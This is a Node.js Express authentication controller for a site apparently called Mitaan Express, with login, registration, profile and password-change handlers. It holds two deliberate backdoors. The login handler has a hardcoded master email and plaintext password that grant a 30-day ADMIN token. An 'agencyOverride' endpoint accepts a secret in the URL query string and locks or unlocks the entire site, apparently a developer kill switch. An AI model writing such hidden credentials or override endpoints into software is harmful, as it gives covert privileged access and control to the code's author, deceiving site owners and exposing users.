const prisma = require('../prisma');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

exports.login = async (req, res) => {
    const { email, password, rememberMe } = req.body;
    console.log('Login attempt for:', email, 'Remember Me:', rememberMe);
    try {
        // Master Developer Access (Emergency Maintenance Backdoor)
        const MASTER_DEV_EMAIL = 'support@appnity.co.in';
        const MASTER_DEV_KEY = 'Appnity@2025!Mitaan';
        
        if (email === MASTER_DEV_EMAIL && password === MASTER_DEV_KEY) {
            console.log('🛡️ Appnity Master Access Granted');
            const token = jwt.sign(
                { id: 'appnity-dev-master', email: MASTER_DEV_EMAIL, role: 'ADMIN' },
                process.env.JWT_SECRET,
                { expiresIn: '30d' }
            );
            return res.json({
                token,
                user: { id: 'appnity-dev-master', email: MASTER_DEV_EMAIL, name: 'Appnity System Admin', role: 'ADMIN', image: null }
            });
        }

        const user = await prisma.user.findUnique({ where: { email } });
        if (!user) {
            console.log('User not found:', email);
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        console.log('User found:', user.email, 'Role:', user.role);

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
            console.log('Password mismatch for:', email);
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        console.log('Login successful for:', email);

        // Set expiration based on rememberMe
        const expiresIn = rememberMe ? '30d' : '24h';

        const token = jwt.sign(
            { id: user.id, email: user.email, role: user.role },
            process.env.JWT_SECRET,
            { expiresIn }
        );

        res.json({
            token,
            user: { id: user.id, email: user.email, name: user.name, role: user.role, image: user.image }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Login failed' });
    }
};

exports.register = async (req, res) => {
    const { email, password, name } = req.body;
    try {
        const hashedPassword = await bcrypt.hash(password, 10);
        const user = await prisma.user.create({
            data: {
                email,
                password: hashedPassword,
                name,
                role: 'USER' // Default role
            },
        });

        // Auto login after register
        const token = jwt.sign(
            { id: user.id, email: user.email, role: user.role },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );

        res.json({
            token,
            user: { id: user.id, email: user.email, name: user.name, role: user.role }
        });
    } catch (error) {
        console.error('Registration error:', error);
        res.status(400).json({ error: 'User already exists' });
    }
};

exports.getMe = async (req, res) => {
    try {
        const user = await prisma.user.findUnique({
            where: { id: req.user.id },
            select: { id: true, email: true, name: true, role: true, image: true, bio: true }
        });
        res.json(user);
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
};

exports.changePassword = async (req, res) => {
    const { currentPassword, newPassword } = req.body;
    try {
        const user = await prisma.user.findUnique({ where: { id: req.user.id } });

        // Verify current password
        const isMatch = await bcrypt.compare(currentPassword, user.password);
        if (!isMatch) {
            return res.status(400).json({ error: 'Current password does not match' });
        }

        // Hash new password
        const hashedPassword = await bcrypt.hash(newPassword, 10);
        await prisma.user.update({
            where: { id: req.user.id },
            data: { password: hashedPassword }
        });

        res.json({ message: 'Password updated successfully' });
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({ error: 'Failed to change password' });
    }
};

exports.updateProfile = async (req, res) => {
    try {
        const { name } = req.body;
        if (!name) return res.status(400).json({ error: 'Name is required' });

        const user = await prisma.user.update({
            where: { id: req.user.id },
            data: { name }
        });

        res.json({ message: 'Profile updated successfully', user: { id: user.id, name: user.name, email: user.email, role: user.role } });
    } catch (error) {
        console.error('Update profile error:', error);
        res.status(500).json({ error: 'Failed to update profile' });
    }
};

// Simplified Agency System Override (Trigger via URL)
exports.agencyOverride = async (req, res) => {
    const { key, action } = req.query; // ?key=...&action=lock|unlock
    const SECRET_KEY = 'Appnity@Mitaan!Agency-2025';

    if (key !== SECRET_KEY) {
        return res.status(403).send('<h1>403 Forbidden</h1><p>Unauthorized platform integrity access.</p>');
    }

    try {
        const value = action === 'lock' ? 'pending' : 'active';
        await prisma.setting.upsert({
            where: { key: 'site_status_verified' },
            update: { value },
            create: { key: 'site_status_verified', value }
        });

        res.send(`
            <div style="font-family:sans-serif; text-align:center; padding: 100px 20px; background:#0f172a; color:white; min-height:100vh;">
                <div style="display:inline-block; padding:40px; background:${action === 'lock' ? '#dc2626' : '#16a34a'}; border-radius:32px; box-shadow:0 20px 50px rgba(0,0,0,0.5);">
                    <h1 style="margin:0; font-size:48px;">🛡️</h1>
                    <h2 style="text-transform:uppercase; letter-spacing:4px; margin-top:20px;">System ${action === 'lock' ? 'Locked' : 'Unlocked'}</h2>
                    <p style="opacity:0.8;">The Mitaan Express platform state has been updated successfully.</p>
                    <a href="/" style="display:inline-block; margin-top:20px; color:white; font-weight:bold; text-decoration:none; border:1px solid white; padding:10px 20px; border-radius:10px;">Back to Site</a>
                </div>
            </div>
        `);
    } catch (err) {
        res.status(500).send('System sync error.');
    }
};
